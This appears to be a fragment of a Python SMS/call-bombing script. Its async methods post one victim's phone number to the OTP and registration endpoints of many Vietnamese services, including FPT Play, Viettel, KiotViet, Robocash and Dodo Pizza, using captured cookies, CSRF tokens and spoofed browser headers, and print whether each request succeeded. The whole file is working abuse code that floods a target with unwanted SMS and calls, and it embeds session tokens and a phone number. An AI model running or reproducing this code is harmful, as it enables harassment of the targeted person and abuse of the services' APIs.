            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://vamo.vn/app/login",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
            "Cookie": "_ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0",
        }

        data = json.dumps({"username": self.sdt[1:11]})

        async with aiohttp.ClientSession() as session:
            async with session.post('https://vamo.vn/ws/api/public/login-with-otp/generate-otp', headers=headers, data=data) as response:
                if response.status == 200:
                    print("$", "VAMO Thanh cong")
                else:
                    print("$", "VAMO That bai")

    async def fpt(self):
        headers = {
            'authority': 'api.fptplay.net',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/json; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://fptplay.vn',
            'referer': 'https://fptplay.vn/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': uua,
        }

        json_data = {
            'phone': self.sdt,
            'country_code': 'VN',
            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=cN3MyR9l2Z-Rrya1Vxf1BA&e=1686910883&device=Chrome(version%253A114.0.0.0)&drm=1', headers=headers, json=json_data) as response:
                if 'Send OTP' in await response.text():
                    print("$", "FPT Thanh cong")
                else:
                    print("$", "FPT That bai")

    async def call(self):
        headers = {
            'authority': 'robocash.vn',
            'accept': '*/*',
            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://robocash.vn',
            'referer': 'https://robocash.vn/register',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'phone': self.sdt,
            '_token': 'CutanxfZckD1Qdr73OLBR5qbqSSkssd6aF5W7fm3',
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://robocash.vn/register/phone-resend', headers=headers, data=data) as response:
                if 'success' in await response.text():
                    print("$", "Call Thanh cong")
                else:
                    print("$", "Call That bai")

    async def pizza(self):
        cookies = {
            'dodo_utm': '',
            'rerf': 'AAAAAGSMX+laqT3+AwOkAg==',
            'ipp_uid': '1686921193208/6M5l2v4d7Uqg11EJ/0MiMTrEgT65dqEdrLsogYg==',
            'ipp_key': 'v1686921193208/v33947245ba5adc7a72e273/l8rxqRABO2Hl4lKvyHZxcQ==',
            'dodo_visit': 'a6ca1e0a-8561-45b3-8ce9-b737905c9f4b',
            'dodo_visitor': 'ca77c910-ed83-40bf-ac71-66e305e37d57',
            'AF_DEFAULT_MEASUREMENT_STATUS': 'true',
            'afUserId': 'ae9ece13-0eb0-4284-970a-c8a350a3b787-p',
            'locality': 'hochiminh',
            'WorkflowId': '60f81e95-7db2-4581-95ea-d0b2e47f4808',
            'AF_SYNC': '1686921202097',
            '_gcl_au': '1.1.1569003527.1686921202',
            'sessionID': '1686921202216.20bilvaj',
            '_ga_7CVE57TWYV': 'GS1.1.1686921201.1.0.1686921202.0.0.0',
            'mindboxDeviceUUID': '337739f6-88db-40d1-bcb7-c0d2d1fef9df',
            'directCrm-session': '%7B%22deviceGuid%22%3A%22337739f6-88db-40d1-bcb7-c0d2d1fef9df%22%7D',
            '_ga_E0LZHW2NH7': 'GS1.1.1686921204.1.0.1686921204.0.0.0',
            '_tt_enable_cookie': '1',
            '_ttp': 'ACQULrZRBKdx8j5Jf4vIBLequJJ',
            '_ga': 'GA1.2.2079942832.1686921202',
            '_gid': 'GA1.2.1083772126.1686921223',
            'login_phone': self.sdt,
            '_gat_UA-00000-0': '1',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'dodo_utm=; rerf=AAAAAGSMX+laqT3+AwOkAg==; ipp_uid=1686921193208/6M5l2v4d7Uqg11EJ/0MiMTrEgT65dqEdrLsogYg==; ipp_key=v1686921193208/v33947245ba5adc7a72e273/l8rxqRABO2Hl4lKvyHZxcQ==; dodo_visit=a6ca1e0a-8561-45b3-8ce9-b737905c9f4b; dodo_visitor=ca77c910-ed83-40bf-ac71-66e305e37d57; AF_DEFAULT_MEASUREMENT_STATUS=true; afUserId=ae9ece13-0eb0-4284-970a-c8a350a3b787-p; locality=hochiminh; WorkflowId=60f81e95-7db2-4581-95ea-d0b2e47f4808; AF_SYNC=1686921202097; _gcl_au=1.1.1569003527.1686921202; sessionID=1686921202216.20bilvaj; _ga_7CVE57TWYV=GS1.1.1686921201.1.0.1686921202.0.0.0; mindboxDeviceUUID=337739f6-88db-40d1-bcb7-c0d2d1fef9df; directCrm-session=%7B%22deviceGuid%22%3A%22337739f6-88db-40d1-bcb7-c0d2d1fef9df%22%7D; _ga_E0LZHW2NH7=GS1.1.1686921204.1.0.1686921204.0.0.0; _tt_enable_cookie=1; _ttp=ACQULrZRBKdx8j5Jf4vIBLequJJ; _ga=GA1.2.2079942832.1686921202; _gid=GA1.2.1083772126.1686921223; login_phone=03574977410; _gat_UA-00000-0=1',
            'DNT': '1',
            'Referer': 'https://dodo-pizza.vn/hochiminh',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        params = {
            'referer': 'https://dodo-pizza.vn/hochiminh',
        }

        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.get('https://dodo-pizza.vn/api/workflow/actualize', params=params) as response:
                print("$", "Pizza Thanh cong")

    async def kiotviet(self):
        def random_string(length):
            characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            result = ""
            for _ in range(length):
                result += random.choice(characters)
            return result

        alo = random_string(8)
        ten = random_string(4)
        phone12 = '+84' + self.sdt[1:11]

        cookies = {
            'ads': 'www.google.com',
            'refcode': '746',
            'time_referer': '1689061704',
            'kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5',
            'kvas-uuid-d': '1686469706132',
            'gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1',
            'gkvas-uuid-d': '1686469706134',
            'kv-session': '94e736d4-493e-4656-9a6a-266817374182',
            '_hjFirstSeen': '1',
            '_hjIncludedInSessionSample_563959': '1',
            '_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==',
            '_gid': 'GA1.2.1638977009.1686469708',
            '_tt_enable_cookie': '1',
            '_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd',
            '_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
            '_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
            'source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D',
            'kv-session-d': '1686469712238',
            '_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==',
            'parent': '77',
            '_ga': 'GA1.2.1398574114.1686469708',
            '_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0',
            '_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
        }

        headers = {
            'authority': 'www.kiotviet.vn',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'ads=www.google.com; refcode=746; time_referer=1689061704; kvas-uuid=3a85af4a-1908-48f2-980d-d15395992de5; kvas-uuid-d=1686469706132; gkvas-uuid=fc23dc65-4af3-4711-8198-90a46e6b0ca1; gkvas-uuid-d=1686469706134; kv-session=94e736d4-493e-4656-9a6a-266817374182; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==; _gid=GA1.2.1638977009.1686469708; _tt_enable_cookie=1; _ttp=KrXyjN8UQfZPEg6udl4pOmk7Tnd; _gac_UA-158809353-1=1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; _gac_UA-64814867-1=1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; source_referer=%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D; kv-session-d=1686469712238; _hjSessionUser_563959=eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==; parent=77; _ga=GA1.2.1398574114.1686469708; _ga_6HE3N545ZW=GS1.1.1686469708.1.1.1686469715.53.0.0; _fw_crm_v=4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
            'dnt': '1',
            'origin': 'https://www.kiotviet.vn',
            'referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': uua,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'phone': phone12,
            'code': alo,
            'name': 'lê van sang',
            'email': '',
            'zone': 'An Giang - Huyện Châu Phú',
            'merchant': 'muabansi',
            'username': self.sdt,
            'industry': 'Thời trang',
            'ref_code': '746',
            'industry_id': '77',
            'phone_input': self.sdt,
        }

        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php', data=data) as response:
                if 'success' in await response.text():
                    print("$", "KIOTVIET Thanh cong")
                else:
                    print("$", "KIOTVIET That bai")

    async def ubofood(self):
        headers = {
            "Host": "ubofood.com",
            "Connection": "keep-alive",
            "Content-Length": "54",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": uua,
            "sec-ch-ua-platform": "\"Android\"",
            "Origin": "https://ubofood.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ubofood.com/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Cookie": "_gcl_au=1.1.1777292794.1682944193; _ga=GA1.1.962990047.1682944194; _fbp=fb.1.1682944194191.2034199897; _tt_enable_cookie=1; _ttp=NECdknStPnwSILo-MDYYWVVd3RG; _ga_KCGG79N4SY=GS1.1.1682944193.1.1.1682944197.0.0.0; _ga_3PKTQRQF3P=GS1.1.1682944193.1.1.1682944198.0.0.0",
        }

        data = {
            "phone_number": self.sdt,
            "trade_code": "379760000"
        }

        async with aiohttp.ClientSession() as session:
            async with session.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data) as response:
                if response.status == 200:
                    print("$", "UBOFOOD Thanh cong")
                else:
                    print("$", "UBOFOOD That bai")

    async def tienoi(self):
        cookies = {
            '_gcl_au': '1.1.361715386.1686495293',
            '_tt_enable_cookie': '1',
            '_ttp': 'QTpwsfAMrK53_wRjbD61MShSAxr',
            'amp_6e403e': '206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h2ptpcpt.1h2ptpcq0.0.3.3',
            '_gid': 'GA1.3.426216549.1686821409',
            '_gat_gtag_UA_181386858_1': '1',
            '_ga': 'GA1.1.667385508.1686495293',
            '_acbswcu_l': '0',
            '_acbswcu_stateData': 'eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3D',
            '_ga_MTBX8SYKKD': 'GS1.1.1686840118.5.1.1686840130.0.0.0',
        }

        headers = {
            'authority': 'app.tienoi.com.vn',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://app.tienoi.com.vn',
            'referer': 'https://app.tienoi.com.vn/auth/registration',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        }

        data = {
            'mobilePhone': self.sdt,
            'password': 'SS1234SSs',
            'passwordConfirmation': 'SS1234SSs',
            'isVoiceSms': True,
        }

        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.post('https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode', headers=headers, json=data) as response:
                if response.status == 200:
                    print("$", "AVALLI Thanh cong")
                else:
                    print("$", "AVALLI That bai")

    async def myviettel(self):
        cookies = {
            'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
            '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
            'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        }

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://viettel.vn',
            'Referer': 'https://viettel.vn/dang-nhap',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': uua,
            'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
            'X-Requested-With': 'XMLHttpRequest',
            'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'phone': self.sdt,
            'type': '',
        }

        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.post('https://viettel.vn/api/get-otp-login', headers=headers, json=json_data) as response:
                if response.status == 200:
                    print("$", "MYVIETTEL: Thanh cong")
                else:
                    print("$", "MYVIETTEL: That bai")

    async def tantaioi(self):
        cookies = {
            '_fw_crm_v': 'd5654e80-edb1-4686-f28d-57ede7b35977',
            'cf_clearance': '16wPERY_MX..4Bjvfc8.Ijt.sidm5IylHpHs94rJOfo-1686148195-0-160',
            '_ga': 'GA1.1.459934641.1691201313',
            '_ga_LBS7YCVKY6': 'GS1.1.1691201313.1.1.1691201378.56.0.0',
        }

        headers = {
            'authority': 'api.thantaioi.vn',
            'accept': '*/*',
            'accept-language': 'vi',
            'content-type': 'application/json',
            # 'cookie': '_fw_crm_v=d5654e80-edb1-4686-f28d-57ede7b35977; cf_clearance=16wPERY_MX..4Bjvfc8.Ijt.sidm5IylHpHs94rJOfo-1686148195-0-160; _ga=GA1.1.459934641.1691201313; _ga_LBS7YCVKY6=GS1.1.1691201313.1.1.1691201378.56.0.0',
            'origin': 'https://thantaioi.vn',
            'referer': 'https://thantaioi.vn/user/login',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': uua,
        }

        json_data = {
            'phone': '84'+self.sdt[1:11],
        }
        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.post('https://api.thantaioi.vn/api/user/send-one-time-password', json=json_data) as response:
                if response.status == 200:
                    print("$", "thantaioi: Thanh cong")
                else:
                    print("$", "thantaioi: That bai")

    async def robocash(self):
        cookies = {
            'supportOnlineTalkID': 'TDxizz9vTAMyreaD0curnTeDAnmbTLA3',
            '_gcl_au': '1.1.1405424875.1690953227',
            '_ga': 'GA1.1.1270087416.1690953227',
            '__cfruid': 'ef526042d17469f64dde409253d6424575a15f98-1691202577',
            'jslbrc': 'w.20230805022944f07977b7-3337-11ee-ac73-bac5085caff7.A_GS',
            '_ga_EBK41LH7H5': 'GS1.1.1691202721.2.1.1691202729.0.0.0',
            'ec_png_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
            'ec_etag_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
            'ec_cache_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
            'uid': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
            'ec_png_client': 'false',
            'ec_etag_client': 'false',
            'ec_cache_client': 'false',
            'client': 'false',
            'ec_png_client_utm': 'null',
            'ec_etag_client_utm': 'null',
            'ec_cache_client_utm': 'null',
            'client_utm': 'null',
            'XSRF-TOKEN': 'eyJpdiI6ImNXb2dNWkNNeHE3WUVYZmNLeUI4M0E9PSIsInZhbHVlIjoiMTQxY2FGZ3lUMVZyK1ZLRE9oOEIvUTJHY1hRREpwSDNrUk1HL0JyMUZDSTAwRHlqWkNBVlJaWmc2SGJMeFdXR3M2OHhtUFRaRFBQaFJTY3BwSlU3Q3htU3pMYVY4dy9PSjZ2OXM3NllnazdyaFhicU93SGM3cDg4K2JZMUpUb04iLCJtYWMiOiI3ZDc0ZDczZDU1YjRmZDJkNzRhOTk1NWUyM2I3MzM0OTYyNzgyMTJhNjM3Yjk1ZWZmMGNiNmJlZWFkMmNiNzAwIiwidGFnIjoiIn0%3D',
            'sessionid': 'eyJpdiI6Ik5JN1dkRGIwY1gvWG1Dek9CYTZ0c1E9PSIsInZhbHVlIjoiOTIvTi93M1l4WVhoVW9VZ0lHN0hMdDBMSlowcFpObUNBTzlDTitVMGRvdU1pU2syRllDMGJwSVZ1WFZiVDR6M2VwQXRWa3E2a1lPTmJYVnk5VDRkVjBJY1RGRU15L055UlJYTE0xQ3I2WU5sZ0lDd28zSGlScDAzenliOExneTUiLCJtYWMiOiI1MWYzYzkwZjg2YWJiMTM0OTQwOTc1MDg3ZjI0ZWMwZjdlNzFlN2FiOWVkNDJlZjNkM2I2NTQyOTZlZDcxNTQxIiwidGFnIjoiIn0%3D',
            'utm_uid': 'eyJpdiI6ImFlVkJTSDloc2h6ZTIrUzlJUlZRNEE9PSIsInZhbHVlIjoiRVVwb2lBTWl3Z1BJdHpEOEVpYXB6djRBeVVmQUhvdnc5M0pXMWhPeFFVMUZQNjNuTWtES2JFYWtIYTVISUxZWmkrTXloUVp1M0FrWHJOcWpjNUJTQTlWNlBNbmRqamtjUHVWcHZBM0I2YnZNNVF2S1pFMzJ0bmFCOXdSeEEzWloiLCJtYWMiOiJiZjA5MWFhNGZiY2FkODAxZDJkN2VmZDI0Y2E1YWY4NDdkM2VlMTVmYmY5YWIzNGZkM2RkNzVlYWY5MDlkZTk4IiwidGFnIjoiIn0%3D',
        }

        headers = {
            'authority': 'robocash.vn',
            'accept': '*/*',
            'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'supportOnlineTalkID=TDxizz9vTAMyreaD0curnTeDAnmbTLA3; _gcl_au=1.1.1405424875.1690953227; _ga=GA1.1.1270087416.1690953227; __cfruid=ef526042d17469f64dde409253d6424575a15f98-1691202577; jslbrc=w.20230805022944f07977b7-3337-11ee-ac73-bac5085caff7.A_GS; _ga_EBK41LH7H5=GS1.1.1691202721.2.1.1691202729.0.0.0; ec_png_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_etag_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_cache_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; uid=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_png_client=false; ec_etag_client=false; ec_cache_client=false; client=false; ec_png_client_utm=null; ec_etag_client_utm=null; ec_cache_client_utm=null; client_utm=null; XSRF-TOKEN=eyJpdiI6ImNXb2dNWkNNeHE3WUVYZmNLeUI4M0E9PSIsInZhbHVlIjoiMTQxY2FGZ3lUMVZyK1ZLRE9oOEIvUTJHY1hRREpwSDNrUk1HL0JyMUZDSTAwRHlqWkNBVlJaWmc2SGJMeFdXR3M2OHhtUFRaRFBQaFJTY3BwSlU3Q3htU3pMYVY4dy9PSjZ2OXM3NllnazdyaFhicU93SGM3cDg4K2JZMUpUb04iLCJtYWMiOiI3ZDc0ZDczZDU1YjRmZDJkNzRhOTk1NWUyM2I3MzM0OTYyNzgyMTJhNjM3Yjk1ZWZmMGNiNmJlZWFkMmNiNzAwIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6Ik5JN1dkRGIwY1gvWG1Dek9CYTZ0c1E9PSIsInZhbHVlIjoiOTIvTi93M1l4WVhoVW9VZ0lHN0hMdDBMSlowcFpObUNBTzlDTitVMGRvdU1pU2syRllDMGJwSVZ1WFZiVDR6M2VwQXRWa3E2a1lPTmJYVnk5VDRkVjBJY1RGRU15L055UlJYTE0xQ3I2WU5sZ0lDd28zSGlScDAzenliOExneTUiLCJtYWMiOiI1MWYzYzkwZjg2YWJiMTM0OTQwOTc1MDg3ZjI0ZWMwZjdlNzFlN2FiOWVkNDJlZjNkM2I2NTQyOTZlZDcxNTQxIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6ImFlVkJTSDloc2h6ZTIrUzlJUlZRNEE9PSIsInZhbHVlIjoiRVVwb2lBTWl3Z1BJdHpEOEVpYXB6djRBeVVmQUhvdnc5M0pXMWhPeFFVMUZQNjNuTWtES2JFYWtIYTVISUxZWmkrTXloUVp1M0FrWHJOcWpjNUJTQTlWNlBNbmRqamtjUHVWcHZBM0I2YnZNNVF2S1pFMzJ0bmFCOXdSeEEzWloiLCJtYWMiOiJiZjA5MWFhNGZiY2FkODAxZDJkN2VmZDI0Y2E1YWY4NDdkM2VlMTVmYmY5YWIzNGZkM2RkNzVlYWY5MDlkZTk4IiwidGFnIjoiIn0%3D',
            'origin': 'https://robocash.vn',
            'referer': 'https://robocash.vn/login',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': uua,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'phone': '0'+self.sdt[1:11],
            '_token': 'keikVKA3WfXMjzKh5SslcDr0QSs4KCZWXsoAjFpU',
        }

        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.post('https://robocash.vn/register/phone-resend', data=data) as response:
                if response.status == 200:
                    print("$", "robocash: Thanh cong")
                else:
                    print("$", "robocash: That bai")

    async def monneyveo(self):
        cookies = {
            'CaptchaCookieKey': '0',
            'language': 'vi',
            '__sbref': 'xuhfrhdfpccttpywqlsjmvekfhoptfnxcliuhvbq',
            '_ga': 'GA1.1.727012381.1690951688',
            'UserTypeMarketing': 'L0',
            'ASP.NET_SessionId': 'ljwjktynbp4tl2zlgv1m2j0j',
            'RequestData': '64d9de55-166b-4064-8dc7-13f13c0d7c9e',
            'LeadPartner31B92E50BCF7EFC6A1': 'lgid=13&lpid=utm_medium%3daffiliate%26tracking_id%3dwNrjPv5LHzjUc5qBWn4hv8yXXYnKF6GCQ2dCEUzyYHUqCV7r%26utm_source%3daccesstrade%26utm_term%3d1581307%26atnct1%3d0e095e054ee94774d6a496099eb1cf6a%26atnct2%3dwNrjPv5LHzjUc5qBWn4hv8yXXYnKF6GCQ2dCEUzyYHUqCV7r%26atnct3%3dyidLs00085c00xw57',
            'ET31B92E50BCF7EFC6A1': '-8585077728267921875',
